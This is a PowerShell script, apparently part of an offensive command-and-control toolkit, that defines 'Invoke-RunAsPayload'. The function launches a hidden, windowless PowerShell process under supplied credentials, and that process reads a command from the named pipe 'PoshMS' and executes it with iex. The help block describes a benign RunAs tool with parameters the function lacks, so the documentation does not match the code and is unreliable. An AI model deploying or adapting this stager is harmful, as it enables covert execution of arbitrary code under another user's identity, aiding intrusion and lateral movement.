<#
.Synopsis
    Starts a new process locally with alternative domain or local credentials
.DESCRIPTION
	Allows a 'RunAs' locally with alternative credentials, arguments and domain options are not mandatory. 
.EXAMPLE
    PS C:\> Invoke-RunAs -Cmd 'c:\temp\runme.bat' -Domain 'testdomain' -Username 'administrator' -Password '$Pa55w0rd$'
    Start a new process locally with alternate creds
.EXAMPLE
    PS C:\> Invoke-RunAs -cmd 'powershell' -args '-c get-process' -Domain 'testdomain' -Username 'administrator' -Password '$Pa55w0rd$'
    Start a new process locally with alternate creds
.EXAMPLE
    PS C:\> Invoke-RunAs -cmd 'powershell' -args '-c get-process' -Username 'administrator' -Password '$Pa55w0rd$'
    Start a new process locally with alternate creds
#>
Function Invoke-RunAsPayload
{

[CmdletBinding()]
Param(
   [Parameter(Mandatory=$False)]
   [string]$Domain,
      [Parameter(Mandatory=$True)]
   [string]$Username,
      [Parameter(Mandatory=$True)]
   [string]$Password

)

$process = ''
$procstartinfo = ''
$error.Clear()
$argerr = ''
$errmsg1 = 'Exception calling "Start" with "1" argument(s): "The system cannot find the file specified"'
$errmsg2 = 'Exception calling "Start" with "1" argument(s): "The user name or password is incorrect"'
$errmsg4 = 'Exception calling "Start" with "1" argument(s): "Logon failure: unknown user name or bad password"'
$errmsg3 = '*Error*'
$PSS = ConvertTo-SecureString $Password -AsPlainText -Force
$creds = new-object system.management.automation.PSCredential $Username,$PSS
$procstartinfo = New-Object System.Diagnostics.ProcessStartInfo
$procstartinfo.WindowStyle = 'Hidden'
$procstartinfo.UseShellExecute = $False
$procstartinfo.CreateNoWindow = $True
$procstartinfo.Verb = 'runAs'
$procstartinfo.FileName = "powershell.exe"
$procstartinfo.UserName = $creds.UserName
$procstartinfo.Password = $creds.Password
If ($Domain)
{
    $procstartinfo.Domain = $Domain
}
$procstartinfo.Arguments = " -c `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
$procstartinfo.CreateNoWindow = $True
$procstartinfo.LoadUserProfile = $False
$procstartinfo.WorkingDirectory = 'c:\'

$output = "Starting"
Try
{
$process = [System.Diagnostics.Process]::Start($procstartinfo)
$argerr = $process.StandardError.ReadToEnd()
If($argerr -like $errmsg3)
    {
        Write-Output $argerr
        BREAK
    }
}
Catch [System.Management.Automation.MethodInvocationException]
{
	Write-Output 'An error was caught.'
    if($($error[0].Exception.Message) -contains $errmsg1)
    {
        $error.Clear()
        $output = 'The command is incorrect'
    }
	ElseIf($($error[0].Exception.Message) -contains $errmsg2)
    {
        $error.Clear()
        $output = 'Check the username and/or password are correct'
    }
	ElseIf($($error[0].Exception.Message) -contains $errmsg4)
    {
        $error.Clear()
        $output = 'Check the username and/or password are correct'
    }
    Else
    {
        $error.Clear()
        $output = 'Unhandled Exception'
    }
}
Finally 
{
Write-Output $output
}
}

